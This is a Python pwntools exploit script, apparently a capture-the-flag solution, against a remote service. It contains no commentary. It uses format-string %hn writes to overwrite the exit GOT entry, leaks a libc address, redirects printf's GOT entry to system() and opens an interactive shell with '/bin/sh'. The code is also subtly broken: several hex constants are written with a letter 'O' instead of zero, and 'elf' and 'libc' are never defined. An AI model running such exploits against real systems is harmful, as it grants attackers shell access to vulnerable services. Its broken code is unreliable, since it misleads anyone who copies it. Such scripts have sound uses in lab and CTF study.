from pwn import *
p = remote('10.81.0.7', 14002) 

def make_payload(addr_value, pos, leak_pos=None) :
    sorted_value = sorted(addr_value.items (), key=lambda x:x[1])
    sorted_dict = dict(sorted_value)

    payload = b""
    bytes_print = 0

    for key in sorted_dict:
        needed_value = sorted_dict[key] - bytes_print
        if needed_value > 0:
            payload += f"%{needed_value}c%{pos}$hn".encode()
        else:
            payload += f"%{pos}$hn".encode()
        pos += 1
        bytes_print = sorted_dict[key]

    if leak_pos:
        for leak in leak_pos:
            payload += f"%{leak}$p".encode()

    payload = payload.ljust(104, b"a")

    for key in sorted_dict:
        payload += p64(key)

    return payload


fmt = {
        elf.got.exit: 0x1196,
        elf.sym.a: Oxfffff,
        elf.sym.a+2: Oxffff,
        elf.sym.a+4: Oxffff,
        elf.sym.a+6: 0xffff,
}

payload1 = make_payload(fmt, 19, [71])
p.sendline(payload1)

p.recvuntil(b"Ox")
leak = int(p.recv(12), 16)
p.recvuntil(b"@@")
libc.address = leak -243 - libc.sym.__libc_start_main
info(f"Libc base: Ox{libc.address:02x}")
system = libc.sym.system



val_system_0 = system & Oxffff
val_system_2 = (system >> (2*8)) & Oxffff
val_system_4 = (system >> (4*8)) & Oxffff

fmt = {
        elf.got.printf+0:val_system_0,
        elf.got.printf+2:val_system_2,
        elf.got.printf+4:val_system_4,
        elf.sym.a: Oxfffff,
        elf.sym.a+2: Oxffff,
        elf.sym.a+4: 0xffff,
        elf.sym.a+6: Oxffff,
}

payload2 = make_payload(fmt, 19)
p.sendline(payload2)


p.sendline(b"/bin/sh\x00")
p.recvuntil(b"@@")
p.interactive()